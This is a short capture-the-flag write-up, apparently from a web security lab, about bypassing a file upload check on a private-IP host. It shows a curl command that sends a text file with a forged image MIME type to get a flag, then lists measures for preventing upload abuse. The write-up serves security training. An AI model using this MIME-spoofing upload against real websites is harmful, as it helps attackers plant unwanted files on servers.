# First step

After checking the http://10.12.180.85/index.php?page=upload page, i see that nothing happens after uploading an image or uploading a file.txt, there is just "/tmp/image.jpg succesfully uploaded."or " Your image was not uploaded. " message, nothing special, so what about uploading an image from your terminal by curl

# How to do that

Go to the folder your image stored in, run:

```bash
curl -X POST -F "uploaded=@payload.txt;type=image/jpeg" -F "MAX_FILE_SIZE=100000" -F "Upload=Upload" http://10.12.181.103/index.php\?page\=upload | grep 'flag'
```

then the result is:
```bash
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3157    0  2750  100   407    538     79  0:00:05  0:00:05 --:--:--   703
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/payload.txt succesfully uploaded.</pre>

```

here is the flag 
```
46910d9ce35b385885a9f7e2bXXXXXXXXXXXXX
```


##  Prevention

Use input validation in both frontend and backend

Always check on the extenssion of the file not only the MIME

Restrict the maximum size of uploaded files to prevent Denial of Service (DoS) attacks or resource overloading

Avoid using the original file name provided by the user, as it can contain malicious code or lead to name collisions

Restrict File Permissions

Check file headers to ensure they match the claimed type